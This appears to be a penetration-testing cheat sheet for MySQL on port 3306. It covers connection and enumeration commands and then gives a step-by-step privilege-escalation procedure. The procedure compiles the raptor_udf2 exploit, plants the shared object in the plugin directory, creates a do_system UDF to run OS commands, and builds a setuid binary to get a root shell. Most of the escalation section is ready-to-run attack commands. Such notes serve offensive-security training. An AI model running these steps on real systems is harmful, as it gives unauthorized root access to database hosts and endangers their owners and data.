# TCP 3306: MySQL

> MySQL is an open-source relational database management system. Its name is a combination of "My", the name of co-founder Michael Widenius's daughter, and "SQL", the abbreviation for Structured Query Language.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/MySQL)</cite>

## Connection

```bash
sudo mysql -u <user>
use <db>;
select * from mysql_func;
```

Remote
```bash
mysql -u <user> -p <password> -h <ip> -P <port>
```

## Enumeration

Check permissions
```bash
show Grants;
```

Show "env"
```bash
select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;
```

## User defined functions (UDF)

Run C code and allows basically everything (system calls, etc.)  
* [Get root shell access using mysql with user defined functions and setuid](http://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html)  
* https://0xdeadbeef.info/exploits/raptor_udf2.c

### Compile exploit

```bash
gcc -g -c raptor_udf2.c -m32
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc -m32
```

### Create function in MySQL

1. Access the database service and select the database to use.
```bash
mysql -u root
use mysql;
```

2. Copy/create the raptor_udf2.so in the directory specified in the plugin_dir variable.
```bash
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
```

3. Create the User Defined Function.
```bash
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
```

4. Test that the UDF works correctly.
```bash
select do_system('id > /tmp/out; chown centos.centos /tmp/out');
```

### Get root shell (using setuid)

```bash
select do_system('gcc -o /tmp/setuid /tmp/setuid.c');
select do_system('chmod u+s /tmp/setuid');
\! sh
/tmp/setuid
```
